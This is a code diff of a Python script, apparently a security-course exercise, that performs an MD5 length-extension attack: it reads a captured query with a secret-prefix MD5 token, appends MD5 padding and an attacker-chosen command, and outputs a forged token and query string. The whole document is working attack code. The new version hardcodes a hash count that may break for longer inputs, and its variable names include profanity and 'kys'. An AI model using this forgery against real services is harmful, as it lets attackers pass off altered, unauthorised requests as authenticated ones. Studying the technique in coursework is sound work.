@@ -1,40 +1,28 @@
-import pymd5
-import sys
-import math
-from struct import pack, unpack
+import sys, io
+from pymd5 import md5, padding
+from urllib import quote
 
-# This function generates the padded the MD5 hash uses for a given input string
-# It returns a hex string that is only the padding, the input is NOT prepended to the padding.
-def padding(string):
-    d = string.encode('hex')
-    n = int(math.ceil((len(d) * 4) / 512.0)) * 512
-    r = n - (len(d) * 4)
-    if r < 64:
-        r += 512
-    p = '1' + ( '0' * (r - 1 - 64))
-    h = pack("<q", len(d) * 4).encode('hex')
-    return hex(int(p, 2))[2:].replace("L", "") + h
+def attack(query, cmd):
+    end_token = query.find('&')
+    token = query[:end_token].split('=')[1]
+    params = query[end_token+1:]
 
-# Open files for reading/get values
-with open(sys.argv[1]) as f:
-    query = f.readline()
+    pad_bytes = padding((8 + len(params)) * 8)
 
-with open(sys.argv[2]) as f:
-    command = f.readline()
+    kms = md5(state=token.decode('hex'), count=512) # set start state to end of user string
+    kms.update(cmd)
+    hashed = kms.hexdigest()
+    print(hashed)
 
-# Get the base MD5 Hash
-token = query.split("user=")[0][6:-1]
-print("Input token of: " + token)
+    return "token=" + hashed + "&" + params + quote(pad_bytes) + cmd
 
-# Get length of initial message (query + 8 for password)
-lengthData = len("user=" + query.split("user=")[1]) + 8
-pad = padding("12345678" + "user=" + query.split("user=")[1])
-lengthMessage = lengthData + len(pad)/2
 
-# Create the MD5
-attack = pymd5.md5(state=token.decode('hex'), count=((lengthData * 8) + len(pad) * 4))
-attack.update(command)
-print("Generated token of: " + attack.hexdigest())
+with open(sys.argv[1], 'r') as fuck:
+    query_string = fuck.read().strip()
 
-with open(sys.argv[3], 'w') as f:
-    f.write("token=" + attack.hexdigest() + "&user=" + query.split("user=")[1] + command)
+with open(sys.argv[2], 'r') as shit:
+    kys = shit.read().strip()
+    result = attack(query_string, kys)
+
+with io.FileIO(sys.argv[3], 'w') as output:
+    output.write(result)
